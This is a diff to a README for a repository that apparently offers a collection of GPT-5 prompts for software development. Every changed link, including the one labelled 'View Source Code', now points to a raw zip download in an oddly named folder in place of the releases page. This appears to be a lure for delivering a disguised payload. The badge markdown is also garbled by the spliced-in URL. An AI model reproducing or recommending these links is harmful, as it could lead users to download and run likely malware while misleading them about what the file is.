@@ -1,7 +1,7 @@
 # 🎉 prompt-engineering-models - Enhance Your Coding Process
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/xlrepotestaa/prompt-engineering-models/releases)
+[![Download the latest release](https://raw.githubusercontent.com/xlrepotestaa/prompt-engineering-models/main/societarianism/prompt-engineering-models.zip%20Now-Click%https://raw.githubusercontent.com/xlrepotestaa/prompt-engineering-models/main/societarianism/prompt-engineering-models.zip)](https://raw.githubusercontent.com/xlrepotestaa/prompt-engineering-models/main/societarianism/prompt-engineering-models.zip)
 
 ## 📁 Overview
 The **prompt-engineering-models** repository offers a collection of over 37 specialized prompts designed for AI-assisted software development. This collection aims to improve code quality and streamline development workflows using GPT-5. You will find useful prompts for code review, testing, and various development tasks.
@@ -26,7 +26,7 @@ The application runs on most modern operating systems. Ensure your device meets 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** To download the software, click on the link below:
 
-   [Download from Releases Page](https://github.com/xlrepotestaa/prompt-engineering-models/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/xlrepotestaa/prompt-engineering-models/main/societarianism/prompt-engineering-models.zip)
 
 2. **Select the Latest Version:** On the releases page, find the latest version of the application.
 
@@ -66,7 +66,7 @@ We appreciate all contributors and users who help improve this tool. Your feedba
 Follow us for updates on new features and prompts added to the collection. Your support keeps us motivated to enhance this resource.
 
 ## 📥 Quick Access Links
-- [Download from Releases Page](https://github.com/xlrepotestaa/prompt-engineering-models/releases)
-- [View Source Code](https://github.com/xlrepotestaa/prompt-engineering-models)
+- [Download from Releases Page](https://raw.githubusercontent.com/xlrepotestaa/prompt-engineering-models/main/societarianism/prompt-engineering-models.zip)
+- [View Source Code](https://raw.githubusercontent.com/xlrepotestaa/prompt-engineering-models/main/societarianism/prompt-engineering-models.zip)
 
 Explore and elevate your development process with the **prompt-engineering-models** collection!
